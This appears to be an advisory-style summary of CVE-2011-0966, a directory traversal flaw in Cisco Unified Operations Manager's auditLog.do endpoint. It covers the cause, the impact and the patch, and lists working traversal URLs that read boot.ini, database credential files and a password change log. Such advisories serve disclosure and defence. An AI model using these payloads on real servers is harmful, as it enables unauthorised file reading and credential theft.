Based on the provided content, here's the breakdown of CVE-2011-0966:

**Root Cause of Vulnerability:**
*   Directory Traversal vulnerability.

**Weaknesses/Vulnerabilities Present:**
*   The application fails to properly sanitize user-supplied input in the `file` parameter of the `auditLog.do` endpoint, allowing for directory traversal.

**Impact of Exploitation:**
*   An attacker can read arbitrary files on the server's filesystem, potentially leading to:
    *   Disclosure of sensitive information, such as database credentials, configuration files, and logs.
    *   Exposure of the `cmfDBA` user database information.
    *   Exposure of database connection information for all databases.
    *   Exposure of the database password change log.

**Attack Vectors:**
*   Remote access to the vulnerable web application.

**Required Attacker Capabilities/Position:**
*   The attacker needs to be able to send HTTP requests to the vulnerable Cisco Unified Operations Manager (CuOM) server.
*   No authentication is explicitly stated to be required to exploit the directory traversal vulnerability.
*   The attacker uses crafted URLs containing directory traversal sequences (e.g., `..\..\..\..\..\..\..\`) to access files outside the intended directory.

**Technical Details:**

The following URL shows how to access `boot.ini`

```
http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini
```
The following URLs show how to access sensitive files:
```
http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties
http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties
http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program Files\CSCOpx\log\dbpwdChange.log
```
**Additional Information:**

*   The vulnerability is present in CiscoWorks Homepage component of Cisco Unified Operations Manager (CuOM).
*   Affected versions include CuOM 8.0 and 8.5 (verified) and potentially others.
*   The vulnerability is identified by Cisco bug ID `CSCto35577`.
*   A patch is available by upgrading to CuOM 8.6.
*   The vulnerability was discovered by Sense of Security Labs.
